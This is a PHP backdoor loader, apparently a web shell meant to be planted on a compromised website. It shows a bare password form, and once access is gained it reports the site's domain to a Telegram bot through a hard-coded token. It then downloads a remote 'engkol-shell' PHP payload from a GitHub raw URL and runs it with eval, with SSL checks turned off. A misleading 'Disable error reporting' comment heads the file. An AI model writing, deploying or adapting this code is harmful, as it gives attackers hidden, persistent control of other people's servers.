<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function sendTelegramNotification($message) {
    $BOT_TOKEN = '8472164310:AAGDV9FTe4AXEHEYCcVoABVNRri3BAPlTHU'; // Ganti dengan token bot kamu
    $CHAT_ID = '-1002733757284'; // Ganti dengan chat ID grup atau user kamu

    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";
    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = 'ddc7e0f8f892c73136b307ced3c78c7b'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    // Buat pesan notifikasi
    $file_name = basename($_SERVER['PHP_SELF']);
    $domain = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $message = "Script <b>$file_name</b> berhasil diakses pada <b>" . date('Y-m-d H:i:s') . "</b>\nDomain: <b>$domain</b>";

    // Kirim notifikasi ke Telegram
    sendTelegramNotification($message);

    // Ambil konten dan eksekusi
    $a = geturlsinfo('https://raw.githubusercontent.com/papakibo/engkol-shell/refs/heads/main/b.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>L</title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="password">P:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="L">
        </form>
    </body>
    </html>
    <?php
}
?>
